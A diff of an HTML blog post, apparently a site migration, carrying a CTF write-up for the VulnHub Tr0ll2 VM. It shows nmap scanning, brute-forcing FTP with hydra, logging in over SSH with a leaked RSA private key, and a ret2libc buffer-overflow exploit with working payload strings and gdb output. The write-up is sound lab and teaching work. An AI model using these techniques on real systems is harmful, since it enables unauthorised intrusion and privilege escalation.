@@ -82,14 +82,17 @@
     <br/>
     <a class="label" href="https://leonjza.github.io/categories/ctf">CTF</a><a class="label" href="https://leonjza.github.io/categories/vulnerable-vm">Vulnerable VM</a><a class="label" href="https://leonjza.github.io/categories/solution">Solution</a><a class="label" href="https://leonjza.github.io/categories/challenge">Challenge</a><a class="label" href="https://leonjza.github.io/categories/vulnhub">VulnHub</a>
     </span>
-    <p>##foreword</p>
+    
 
-<p>[Tr0ll2]() is a successor in a boot2root series by <a href="https://twitter.com/Maleus21">@Maleus21</a> hosted over at <a href="http://vulnhub.com/">VulnHub</a>. Having been able to <a href="https://leonjza.github.io/blog/2014/08/15/taming-the-troll/">pwn Tr0ll1</a>, I gave this one a shot too.</p>
+<h2 id="foreword:ff2d6ad4b47b6fd6836c2e3c0a90356f">foreword</h2>
+
+<p><a href="https://www.vulnhub.com/entry/tr0ll-2,107/">Tr0ll2</a> is a successor in a boot2root series by <a href="https://twitter.com/Maleus21">@Maleus21</a> hosted over at <a href="http://vulnhub.com/">VulnHub</a>. Having been able to <a href="https://leonjza.github.io/blog/2014/08/15/taming-the-troll/">pwn Tr0ll1</a>, I gave this one a shot too.</p>
 
 <p>Here is my experience taming the troll, again.</p>
 
-<p>##getting started
-Like almost all boot2roots, we get right into it by slapping the VM into a hypervisor (VirtualBox in my case), discovering the IP address and running a <code>nmap</code> against it:</p>
+<h2 id="getting-started:ff2d6ad4b47b6fd6836c2e3c0a90356f">getting started</h2>
+
+<p>Like almost all boot2roots, we get right into it by slapping the VM into a hypervisor (VirtualBox in my case), discovering the IP address and running a <code>nmap</code> against it:</p>
 
 <pre><code class="language-bash">root@kali:~/Desktop/troll2# nmap -sV --reason 192.168.56.101
 
@@ -110,10 +113,18 @@ Nmap done: 1 IP address (1 host up) scanned in 15.21 seconds
 
 <p>ftp, ssh and http. Quite an attack surface to start with. I start with a quick google for <em>vsftpd 2.0.8 exploit</em> with nothing apparently obvious jumping out at me. I also quickly attempt to SSH to the server just to check if there aren&rsquo;t any strange banners etc to be found which was not the case.</p>
 
-<p>##web server
-Opening up a browser to <a href="http://192.168.56.101">http://192.168.56.101</a> revealed a familiar image:</p>
+<h2 id="web-server:ff2d6ad4b47b6fd6836c2e3c0a90356f">web server</h2>
 
-<p>{% img <a href="https://i.imgur.com/7lyyzPS.png">https://i.imgur.com/7lyyzPS.png</a> %}
+<p>Opening up a browser to <a href="http://192.168.56.101">http://192.168.56.101</a> revealed a familiar image:</p>
+
+<p>
+<figure >
+    
+        <img src="https://leonjza.github.io/images/troll2_web.png" />
+    
+    
+</figure>
+
 Oh. Hai. The sources serving up the image had the comment <code>&lt;!-- Nothing to see here, but good try NOOB!&gt;</code> with the image.</p>
 
 <p>Further poking around got me to checking if a robots.txt file was present. It was and contained some interestingly named entries. Some of the directories would 404, however a few would 200 with exactly the same content. The directories that returned HTTP 200 were:</p>
@@ -126,7 +137,14 @@ Oh. Hai. The sources serving up the image had the comment <code>&lt;!-- Nothing 
 
 <p>The content served up at these URLs:</p>
 
-<p>{% img <a href="https://i.imgur.com/yH4vTKx.png">https://i.imgur.com/yH4vTKx.png</a> %}</p>
+
+<figure >
+    
+        <img src="https://leonjza.github.io/images/troll2_noob.png" />
+    
+    
+</figure>
+
 
 <p>The source that serves up this image had the comment <code>&lt;!--What did you really think to find here? Try Harder!&gt;</code> with the image.</p>
 
@@ -141,7 +159,7 @@ HTTP request sent, awaiting response... 200 OK
 Length: 15831 (15K) [image/jpeg]
 Saving to: `cat_the_troll.jpg.3'
 
-100%[=======&gt;] 15,831      --.-K/s   in 0s      
+100%[=======&gt;] 15,831      --.-K/s   in 0s
 
 2014-10-10 07:31:37 (191 MB/s) - `cat_the_troll.jpg.3' saved [15831/15831]
 </code></pre>
@@ -174,11 +192,18 @@ root@kali:~/Desktop/troll2/c# tail -n 1 cat_the_troll.jpg.1
 
 <p>_Look Deep within y0ur<em>self for the answer</em>. Hmm. Keeping in mind some of the previous tricks tr0ll had and the fact that the words _y0ur<em>self</em> were written differently, I tried to use this as a web path:</p>
 
-<p>{% img <a href="https://i.imgur.com/oNInvrf.png">https://i.imgur.com/oNInvrf.png</a> %}</p>
+
+<figure >
+    
+        <img src="https://leonjza.github.io/images/troll2_y0ur_self.png" />
+    
+    
+</figure>
+
 
 <p>I downloaded <code>answer.txt</code> and started to check what is happening inside:</p>
 
-<pre><code class="language-bash">root@kali:~# head answer.txt 
+<pre><code class="language-bash">root@kali:~# head answer.txt
 QQo=
 QQo=
 QUEK
@@ -212,8 +237,9 @@ AM
 
 <p>My guess was that this has to be a password for either the FTP or SSH service.</p>
 
-<p>##ftpee
-I now had what I assumed was a password. No other web related hints had me focussing there and I started to doubt my findings.</p>
+<h2 id="ftpee:ff2d6ad4b47b6fd6836c2e3c0a90356f">ftpee</h2>
+
+<p>I now had what I assumed was a password. No other web related hints had me focussing there and I started to doubt my findings.</p>
 
 <p>As a last resort, I started to get together a wordlist that I could give to hydra to chew on. My idea was to grab all of the strings from the web service, including the one found in <code>answer.txt</code>, mutate it a bit and hand it over to hydra to do its work.</p>
 
@@ -266,7 +292,7 @@ ftp&gt; ls
 -rw-r--r--    1 0        0            1474 Oct 04 01:09 lmao.zip
 226 Directory send OK.
 
-ftp&gt; get lmao.zip 
+ftp&gt; get lmao.zip
 local: lmao.zip remote: lmao.zip
 227 Entering Passive Mode (192,168,56,101,105,73)
 150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
@@ -277,17 +303,18 @@ ftp&gt; bye
 221 Goodbye.
 </code></pre>
 
-<p>#noob key
-We find ourselves with a zip archive called <code>lmao.zip</code>. A encrypted one :(</p>
+<h2 id="noob-key:ff2d6ad4b47b6fd6836c2e3c0a90356f">noob key</h2>
+
+<p>We find ourselves with a zip archive called <code>lmao.zip</code>. A encrypted one :(</p>
 
 <p>I tried a few passwords from the wordlist that I had built earlier and eventually got to the word we got out of <code>answer.txt</code>:</p>
 
-<pre><code class="language-bash">root@kali:~/Desktop/troll2# unzip lmao.zip 
+<pre><code class="language-bash">root@kali:~/Desktop/troll2# unzip lmao.zip
 Archive:  lmao.zip
 [lmao.zip] noob password: #ItCantReallyBeThisEasyRightLOL
   inflating: noob
 
-root@kali:~# cat noob 
+root@kali:~# cat noob
 -----BEGIN RSA PRIVATE KEY-----
 MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
 yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
@@ -319,14 +346,15 @@ zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
 
 <p>A unencrypted private key! Called <code>noob</code>. I guessed <code>noob</code> may be the username, so I fixed up the permissions on the key and tried my luck:</p>
 
-<pre><code class="language-bash">root@kali:~/Desktop/troll2# chmod 600 noob 
+<pre><code class="language-bash">root@kali:~/Desktop/troll2# chmod 600 noob
 root@kali:~/Desktop/troll2# ssh noob@192.168.56.101 -i noob
 TRY HARDER LOL!
 Connection to 192.168.56.101 closed.
 </code></pre>
 
-<p>##shocking isn&rsquo;t it
-Surprise surprise. It seemed like we are in fact authenticating, but we don&rsquo;t have a shell. I figured one of two things could be happening here. First, the <code>.bashrc</code> may have been modified with something that echoes the text <code>TRY HARDER LOL!</code> and exits, or there is some restriction on the SSH key for <code>noob</code>.</p>
+<h2 id="shocking-isn-t-it:ff2d6ad4b47b6fd6836c2e3c0a90356f">shocking isn&rsquo;t it</h2>
+
+<p>Surprise surprise. It seemed like we are in fact authenticating, but we don&rsquo;t have a shell. I figured one of two things could be happening here. First, the <code>.bashrc</code> may have been modified with something that echoes the text <code>TRY HARDER LOL!</code> and exits, or there is some restriction on the SSH key for <code>noob</code>.</p>
 
 <p>My first attempts were to specify a command with <code>-t</code> as <code>/bin/bash</code>, but this did not work.</p>
 
@@ -339,17 +367,18 @@ uid=1002(noob) gid=1002(noob) groups=1002(noob)
 
 <p>Shocking :) To confirm, the <code>authorized_keys</code> file has the entry <code>command=&quot;echo TRY HARDER LOL!&quot;</code> before the public key.</p>
 
-<p>##which door leads to r00t
-With shell access to the machine, it was time to start enumerating and learn more about what we are facing next. Nothing particularly interesting popped up, until I noticed a directory <code>/nothing_to_see_here</code>.</p>
+<h2 id="which-door-leads-to-r00t:ff2d6ad4b47b6fd6836c2e3c0a90356f">which door leads to r00t</h2>
+
+<p>With shell access to the machine, it was time to start enumerating and learn more about what we are facing next. Nothing particularly interesting popped up, until I noticed a directory <code>/nothing_to_see_here</code>.</p>
 
 <p><code>/nothing_to_see_here</code> had another directory inside of it <code>choose_wisely/</code> with another 3 sub directories called <code>door1</code>, <code>door2</code> and <code>door3</code>.</p>
 
 <p>All 3 &lsquo;doors&rsquo; had a setuid binary called <code>r00t</code>. I ran the first one which had the output:</p>
 
-<pre><code class="language-bash">noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t 
+<pre><code class="language-bash">noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t
 Good job, stand by, executing root shell...
 BUHAHAHA NOOB!
-noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ 
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$
 Broadcast message from noob@Tr0ll2
     (/dev/pts/0) at 0:48 ...
 
@@ -362,7 +391,7 @@ Connection to 192.168.56.101 closed.
 
 <p>The machine rebooted and I logged in again as <code>noob</code>, changing directories to the <code>r00t</code> binaries. I tried to run <code>strings</code> on them, but it seems like the command was unavailable. No worries, next on the list was <code>od</code>.</p>
 
-<pre><code class="language-bash">noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ od -S 1 door3/r00t 
+<pre><code class="language-bash">noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ od -S 1 door3/r00t
 [...]
 0001214 __libc_start_main
 0001236 GLIBC_2.0
@@ -370,7 +399,7 @@ Connection to 192.168.56.101 closed.
 0001453 Q
 0001521 %
 0001526 h
-0001626 h 
+0001626 h
 0001646 h(
 0002066 t&amp;
 0002073 '
@@ -382,7 +411,7 @@ Connection to 192.168.56.101 closed.
 0002750 L
 0002760 p
 0003025 zR
-0003044  
+0003044
 0003060 p
 0003077 x
 [...]
@@ -392,8 +421,9 @@ Connection to 192.168.56.101 closed.
 
 <p>This was only a minor annoyance and I had enough time to check out the binaries using <code>od</code> to figure out which one I should be looking at. The other binary that would have been a problem appears to chmod /bin/ls so that it becomes unusable. Lucky I missed that one.</p>
 
-<p>##bof bof bof your boat&hellip;
-I copied the binary of interest to <code>/tmp</code> so that I wont be bothered by the shuffling thing that was going on again. Most importantly the one of interest was slightly bigger in size compared to the others so it was easy to identify it apart from the others.</p>
+<h2 id="bof-bof-bof-your-boat:ff2d6ad4b47b6fd6836c2e3c0a90356f">bof bof bof your boat&hellip;</h2>
+
+<p>I copied the binary of interest to <code>/tmp</code> so that I wont be bothered by the shuffling thing that was going on again. Most importantly the one of interest was slightly bigger in size compared to the others so it was easy to identify it apart from the others.</p>
 
 <p>With the binary in <code>/tmp</code>, <code>noob</code> was the owner. For testing purposes this was ok as the exploit should work the same with the one with the desired permissions.</p>
 
@@ -419,12 +449,12 @@ Segmentation fault
 
 <p>500 &ldquo;A&rdquo;&rsquo;s, and we have a crash. Perfect. It also seems like a really easy buffer overflow vulnerability. I quickly checked that ASLR was not enabled. If it is not, I planned on popping this one with a ret2libc attack.</p>
 
-<pre><code class="language-bash">noob@Tr0ll2:/tmp$ ldd ./r00t 
+<pre><code class="language-bash">noob@Tr0ll2:/tmp$ ldd ./r00t
     linux-gate.so.1 =&gt;  (0xb7fff000)
     libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
     /lib/ld-linux.so.2 (0x80000000)
 
-noob@Tr0ll2:/tmp$ ldd ./r00t 
+noob@Tr0ll2:/tmp$ ldd ./r00t
     linux-gate.so.1 =&gt;  (0xb7fff000)
     libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
     /lib/ld-linux.so.2 (0x80000000)
@@ -433,8 +463,9 @@ noob@Tr0ll2:/tmp$ ldd ./r00t
 <p>Both entries returned the same address for libc, indicating that ASLR was not enabled :)
 Tr0ll2 was also nice enough to include <code>gdb</code>, making the exploit development process very easy.</p>
 
-<p>##the exploit
-With all of the information gathered so far about this particularly interesting <code>r00t</code> binary, it was time to quickly write the overflow exploit to attempt and spawn us a root shell.</p>
+<h2 id="the-exploit:ff2d6ad4b47b6fd6836c2e3c0a90356f">the exploit</h2>
+
+<p>With all of the information gathered so far about this particularly interesting <code>r00t</code> binary, it was time to quickly write the overflow exploit to attempt and spawn us a root shell.</p>
 
 <p>First, we have to inspect the crash when we send those 500 A&rsquo;s</p>
 
@@ -510,7 +541,7 @@ Reading symbols from /tmp/r00t...done.
 Breakpoint 1 at 0x8048444: file bof.c, line 3.
 
 (gdb) r         # here we run the application....
-Starting program: /tmp/r00t 
+Starting program: /tmp/r00t
 
 Breakpoint 1, main (argc=1, argv=0xbffffd84) at bof.c:3
 3   bof.c: No such file or directory.
@@ -537,9 +568,9 @@ EGG=/bin/sh
 
 <p>Next, we can use a small C program to tell us where this EGG is in memory:</p>
 
-<pre><code class="language-bash">noob@Tr0ll2:/tmp$ cat /tmp/findegg.c 
+<pre><code class="language-bash">noob@Tr0ll2:/tmp$ cat /tmp/findegg.c
 #include &lt;unistd.h&gt;
- 
+
 int main(void)
 {
   printf(&quot;EGG address: 0x%lx\n&quot;, getenv(&quot;EGG&quot;)+4);
@@ -549,7 +580,7 @@ int main(void)
 noob@Tr0ll2:/tmp$ gcc /tmp/findegg.c -o /tmp/findegg
 [...]
 
-noob@Tr0ll2:/tmp$ /tmp/findegg 
+noob@Tr0ll2:/tmp$ /tmp/findegg
 EGG address: 0xbfffff04
 </code></pre>
 
@@ -569,7 +600,7 @@ Segmentation fault
 <p>Wups, segfault. You will find that this is probably because the location of our EGG in memory did not compensate for the length of the binary name. Our binary is called <code>r00t</code>, which is 4 chars long, so maybe we need to move the location of our EGG up with up to 4 bytes. For demonstration purposes I am going to show all the attempts for each byte:</p>
 
 <pre><code class="language-bash"># so just to recap, we check for the location of the EGG
-noob@Tr0ll2:/tmp$ ./findegg 
+noob@Tr0ll2:/tmp$ ./findegg
 EGG address: 0xbfffff04
 
 # EGG is at 0xbfffff04, so in little endian format we have:
@@ -587,8 +618,9 @@ noob@Tr0ll2:/tmp$ ./r00t $(python -c 'print &quot;A&quot; *268 + &quot;\x60\xb0\
 $
 </code></pre>
 
-<p>##trollin the rootin
-So <code>0xbfffff06</code> as a EGG location will give us shell in our testing! To finish off then, I have to find the correct <code>r00t</code> binary in all of the <code>door{1,2,3}</code> folders and attempt my exploit there:</p>
+<h2 id="trollin-the-rootin:ff2d6ad4b47b6fd6836c2e3c0a90356f">trollin the rootin</h2>
+
+<p>So <code>0xbfffff06</code> as a EGG location will give us shell in our testing! To finish off then, I have to find the correct <code>r00t</code> binary in all of the <code>door{1,2,3}</code> folders and attempt my exploit there:</p>
 
 <pre><code class="language-bash">noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print &quot;A&quot; *268 + &quot;\x60\xb0\xe6\xb7&quot; + &quot;JUNK&quot; + &quot;\x06\xff\xff\xbf&quot;')
 sh: 1: in:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games: not found
